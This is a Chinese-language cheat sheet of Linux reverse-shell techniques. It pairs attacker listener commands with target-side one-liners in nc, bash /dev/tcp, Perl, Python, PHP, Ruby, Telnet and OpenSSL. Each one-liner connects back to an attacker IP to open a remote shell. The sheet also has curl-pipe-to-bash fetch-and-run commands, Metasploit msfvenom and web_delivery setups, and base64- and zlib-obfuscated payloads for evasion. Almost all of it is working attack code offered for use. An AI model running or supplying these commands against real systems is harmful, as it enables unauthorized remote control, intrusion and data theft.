# Linux反弹shell

## NC

**攻击机**

```bash
nc -lvvp 6666
```

**靶机**

```bash
nc -e /bin/sh 192.168.1.106 9999
```

### 无e参数反弹shell

**攻击机**

```bash
nc -lvvp 6666
```

**靶机**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.106 9999 >/tmp/f
```

或

```bash
mknod backpipe p; nc 192.168.1.106 9999 0<backpipe | /bin/bash 1>backpipe 2>backpipe
```

## Bash

**攻击机**

```bash
nc -lvvp 9999
```

**靶机**

```bash
bash -i >& /dev/tcp/192.168.1.106/9999 0>&1
#或
exec 5<>/dev/tcp/192.168.1.106/9999;cat <&5 | while read line; do $line 2>&5 >&5; done
#base64绕过 编码部分：bash -i >& /dev/tcp/192.168.1.106/9999 0>&1
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA2Lzk5OTkgMD4mMQ==|base64 -d|bash -i"
```

### MSF

**攻击机**

```bash
msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.106 lport=9999 -f raw

msf
msf6 > use multi/handler
msf6 exploit(multi/handler) > set LPORT 9999
msf6 exploit(multi/handler) > set LHOST 192.168.1.106
msf6 exploit(multi/handler) > set payload /cmd/unix/reverse_bash
msf6 exploit(multi/handler) > run
```

**靶机**

将上述msfvenom运行后弹出的payload在靶机上执行

```bash
bash -c '0<&121-;exec 121<>/dev/tcp/192.168.1.106/9999;sh <&121 >&121 2>&121'
```

## Perl

**攻击机**

```bash
nc -lvvp 9999
```

**靶机**

```perl
perl -e 'use Socket;$i="192.168.1.106";$p=9999;socket(S,PF_INET,SOCK_STREAM, getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
#或
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.106:9999");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Curl

**攻击机**

创建一个html文件，其中写入以下语句。

```bash
bash -i >& /dev/tcp/192.168.1.106/9999 0>&1
```

开启一个监听

```bash
nc -lvvp 9999
```

新开一个终端，在html的文件目录下开启一个http服务

```python
python3 -m http.server
```

**靶机**

```bash
curl 139.155.49.43:8000|bash
```

## Python

**攻击机**

```bash
nc -lvvp 9999
```

**靶机**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.106",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'#bash可改为sh或zsh
```

### 通过Msfvenom生成python反弹shell的payload

**攻击机**

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=9999 -f raw

msfconsole
msf6 > handler -p python/meterpreter/reverse_tcp -H 192.168.1.106 -P 9999
```

**靶机**

将msfvenom弹出的payload放进来执行，前面加上python3 -c，将payload用""括起来。

```bash
python3 -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/ordMMBvapZbdxQoiHkREcPcmIm06amiahCSrVfG/29DFOczwZt68+VCjsz7mwcoBI//WquNdG7CueIj+KCOPakTyan0+5crkvjVvCGXBdiSL/mv2WWiWZrEEWPMT3j9c373sD483V/cs8YS0xqCMALTcrkVZb0QpyqKmfDsbS5zOYzuQDCeJLibxNF0EjejgnBHdLEuJo3GtHIBe3lIehEf5ARVjT8Uz6ZsT1ox8viuNuUYDPbvQs1x/9l9dLWlGcEIJ6W7Ro7Sj8xgCLC8QXV2lZI+JyX9ooLvwy8gfLF1fRQ==')[0])))"
```

### 通过msf的Web delivery反弹shell

**攻击机**

```bash
msfconsole
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lport 9999
msf6 exploit(multi/script/web_delivery) > set lhost 192.168.1.106
msf6 exploit(multi/script/web_delivery) > set srvhost 192.168.1.106
msf6 exploit(multi/script/web_delivery) > run
#会弹出payload
```

**靶机**

弹出的payload开头是python，如果运行错误则改成python3

```bash
python3 -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.1.106:8080/EgKVny63zGE22', context=ssl._create_unverified_context());exec(r.read());"
```

## PHP

```bash
php -r '$sock=fsockopen("192.168.1.106",9999);exec("/bin/bash -i <&3 >&3 2>&3");'#bash可改为sh或zsh
```

### Msfvenom生成php反弹shell脚本

**攻击机**

```bash
msfvenom -p php/bind_php lport=9999 -f raw > bind_php.php

msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set lport 9999
msf6 exploit(multi/handler) > set payload php/bind_php
msf6 exploit(multi/handler) > run
```

新开一个终端

```bash
python3 -m http.server
```

**靶机**

```bash
curl http://192.168.1.106:8000/bind_php.php
```

### 通过web_delivery反弹shell：

**攻击机**

```bash
msfconsole
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set target 1
msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost 192.168.1.106
msf6 exploit(multi/script/web_delivery) > set lport 9999
msf6 exploit(multi/script/web_delivery) > set srvhost 192.168.1.106
msf6 exploit(multi/script/web_delivery) > run -j
```

将弹出的payload在靶机上执行

**靶机**

msf产生的payload

```bash
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.1.106:8080/o0lAy1wJfqoU', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```

## Ruby

**攻击机**

```bash
msfvenom -p cmd/unix/bind_ruby lport=9999 -f raw
#同上用python开启http，msf开启监听
```

**靶机**

执行msfvenom产生的payload

```bash
ruby -rsocket -e 'exit if fork;s=TCPServer.new("9999");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end;end'
```

## Telnet

**攻击机**

```bash
nc -lvvp 9998
```

开一个新终端

```bash
nc -lvvp 9999
```

**靶机**

```bash
telnet 192.168.1.106 9998 | /bin/bash | telnet 192.168.1.106 9999
```

## OpenSSL

> openssl反弹443端口，流量加密传输

1. 在远程攻击主机上生成秘钥文件

   ```BASH
   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
   ```

2. 在远程攻击主机上启动监视器

   ```BASH
   openssl s_server -quiet -key key.pem -cert cert.pem -port 443
   ```

3. 在目标机上反弹shell

   ```BASH
   mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client - quiet -connect 192.168.1.106:443 > /tmp/s; rm /tmp/s
   ```

